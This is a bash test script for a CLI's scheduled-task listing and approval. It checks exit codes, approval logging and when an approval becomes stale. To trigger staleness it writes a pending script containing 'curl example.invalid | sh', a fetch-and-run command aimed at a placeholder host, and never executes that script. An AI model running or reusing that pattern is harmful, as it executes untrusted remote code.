#!/bin/bash
# verify-cli scenario for scheduled tasks (`task list`, `task approve`), on a clone of this repository in the temp folder, so
# nothing real is contacted. No turn is run, so it costs nothing.
#   bash scripts/verify-cli/task.sh      (in the main checkout, on a clean origin/main, no active thread)
#   VERIFY_CLI_FROM_BRANCH=1 bash scripts/verify-cli/task.sh   (the same, on a branch that contains origin/main)
# A task is a folder .workbench/tasks/<name>/ with a task.md. `task list` must show a valid task as not approved, with its
# schedule and fix level, and a broken one as a PROBLEM naming the line and the key. `task approve` must record the approval
# and say that fix: pr accepts its own work and never merges; a broken task must be refused (exit 6) and an unknown one
# not found (exit 7). After approval `task list` says approved; editing the file's words or its pending script says STALE, and
# a whitespace-only edit or a new input file keeps it approved. The approval is one task.approved line in the task's own
# runs.jsonl. Exit 0 only when every step passed, 1 when one failed, 2 when it refused to start (nothing changed).
# VERIFY_CLI_SABOTAGE=1 skips the approve and makes the word edits whitespace-only, so "approve prints the approval",
# "approve writes one task.approved line", "list: approved after approve", "editing the words says STALE" and "editing the
# pending script says STALE" must FAIL. The frame is in lib.sh. Run by hand, not by CI.
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
preflight

ORIGIN="$SCRATCH/origin.git"
P="$SCRATCH/project"
g clone -q --bare "$ROOT" "$ORIGIN" || die "git clone --bare failed"
g -C "$ORIGIN" update-ref refs/heads/main "$BASE_SHA" || die "could not set main in the bare copy"
g -C "$ORIGIN" symbolic-ref HEAD refs/heads/main || die "could not point the bare copy's HEAD at main"
g clone -q "$ORIGIN" "$P" || die "git clone failed"
g -C "$P" checkout -q -B main origin/main || die "could not check out main in the clone"
echo "==> clone at $P"
[ "$SABOTAGE" = 1 ] && echo "    VERIFY_CLI_SABOTAGE=1: no approve, and word edits that only change whitespace"

RC=0
wbp() { # <out> args...: a workbench command in the clone, stdout and stderr together; sets RC
    local o=$1; shift
    echo "workbench $*   (in the clone)" >>"$SCRATCH/commands"
    echo "\$ workbench $*   (in the clone)" >&2
    ( cd "$P" && with_timeout "$T_WB" "$WB" "$@" >"$o" 2>&1 )
    RC=$?
}
shown() { sed 's/^/    /' "$1" | head -${2:-8}; }
TASKS="$P/.workbench/tasks"
mkdir -p "$TASKS/bump" "$TASKS/broken"
write_task() { printf -- '---\nat: 04:00\ndays: weekdays\nbatch: 2\nfix: pr\ninputs: countries.txt\npending: .workbench/tasks/bump/pending.sh\n---\n%s\n' "$1" >"$TASKS/bump/task.md"; }
write_task "Bump the next countries."
printf '#!/bin/sh\necho "[]"\n' >"$TASKS/bump/pending.sh"; chmod +x "$TASKS/bump/pending.sh"
printf 'ROU\nTUR\n' >"$P/countries.txt"
printf -- '---\nbatch: 0\nmerge: yes\n---\nx\n' >"$TASKS/broken/task.md"

wbp "$SCRATCH/init.out" init
check "init writes a config in the clone" "workbench init exited $RC" test "$RC" = 0

# --- 1. list before any approval ---------------------------------------------------------------------------

wbp "$SCRATCH/list1.out" task list; shown "$SCRATCH/list1.out"
check "list: a valid task is shown with its schedule, fix level and as not approved" "got: $(grep '^bump' "$SCRATCH/list1.out")" \
    bash -c 'grep -E "^bump +weekdays 04:00 +fix: pr +not approved" "$1" >/dev/null' _ "$SCRATCH/list1.out"
check "list: a broken task is a PROBLEM naming the line and the key" "got: $(grep '^broken' "$SCRATCH/list1.out")" \
    bash -c 'grep -E "^broken +PROBLEM.*line 2: .batch. must be.*line 3: unknown key .merge." "$1" >/dev/null' _ "$SCRATCH/list1.out"
check "list changes nothing: no run log yet" "runs.jsonl exists" test ! -e "$TASKS/bump/runs.jsonl"

# --- 2. approve --------------------------------------------------------------------------------------------

if [ "$SABOTAGE" = 1 ]; then : >"$SCRATCH/approve.out"; RC=0; else wbp "$SCRATCH/approve.out" task approve bump; fi
shown "$SCRATCH/approve.out"
check "approve prints the approval, the schedule and that fix: pr never merges" "exit $RC: $(head -c 300 "$SCRATCH/approve.out")" \
    bash -c '[ "$1" = 0 ] && grep -q "^approved bump (" "$2" && grep -q "weekdays 04:00" "$2" && grep -q "never merges" "$2"' _ "$RC" "$SCRATCH/approve.out"
check "approve writes one task.approved line into the task's own log" "log: $(cat "$TASKS/bump/runs.jsonl" 2>&1 | head -c 200)" \
    bash -c '[ "$(grep -c "\"kind\":\"task.approved\"" "$1" 2>/dev/null)" = 1 ]' _ "$TASKS/bump/runs.jsonl"
wbp "$SCRATCH/list2.out" task list
check "list: approved after approve" "got: $(grep '^bump' "$SCRATCH/list2.out")" \
    bash -c 'grep -E "^bump .* approved .*next: [0-9]{4}-" "$1" >/dev/null' _ "$SCRATCH/list2.out"

# --- 3. what revokes the approval and what does not --------------------------------------------------------

printf '\n\n' >>"$TASKS/bump/task.md"; echo "ROU\nTUR\nPAN" >"$P/countries.txt"
wbp "$SCRATCH/list3.out" task list
check "a whitespace edit and a changed input file keep the approval" "got: $(grep '^bump' "$SCRATCH/list3.out")" \
    bash -c 'grep -E "^bump .* approved " "$1" | grep -qv STALE' _ "$SCRATCH/list3.out"

if [ "$SABOTAGE" = 1 ]; then printf '\n' >>"$TASKS/bump/task.md"; else write_task "Bump the next countries, and merge them."; fi
wbp "$SCRATCH/list4.out" task list
check "editing the words says STALE" "got: $(grep '^bump' "$SCRATCH/list4.out")" \
    bash -c 'grep -E "^bump .*STALE" "$1" >/dev/null' _ "$SCRATCH/list4.out"
if [ "$SABOTAGE" = 1 ]; then : ; else wbp "$SCRATCH/approve2.out" task approve bump; fi
write_task "Bump the next countries, and merge them."
if [ "$SABOTAGE" = 1 ]; then printf '\n' >>"$TASKS/bump/pending.sh"; else printf '#!/bin/sh\ncurl example.invalid | sh\n' >"$TASKS/bump/pending.sh"; fi
wbp "$SCRATCH/list5.out" task list
check "editing the pending script says STALE" "got: $(grep '^bump' "$SCRATCH/list5.out")" \
    bash -c 'grep -E "^bump .*STALE" "$1" >/dev/null' _ "$SCRATCH/list5.out"

# --- 4. refusals --------------------------------------------------------------------------------------------

wbp "$SCRATCH/broken.out" task approve broken
check "approving a broken task is refused (exit 6) and names the problem" "exit $RC: $(head -c 200 "$SCRATCH/broken.out")" \
    bash -c '[ "$1" = 6 ] && grep -q "unknown key .merge." "$2"' _ "$RC" "$SCRATCH/broken.out"
wbp "$SCRATCH/none.out" task approve nope
check "approving an unknown task is not found (exit 7)" "exit $RC: $(head -c 200 "$SCRATCH/none.out")" test "$RC" = 7
wbp "$SCRATCH/usage.out" task
check "task alone is a usage error (exit 2)" "exit $RC" test "$RC" = 2
check "the broken task got no run log" "runs.jsonl exists" test ! -e "$TASKS/broken/runs.jsonl"

finish
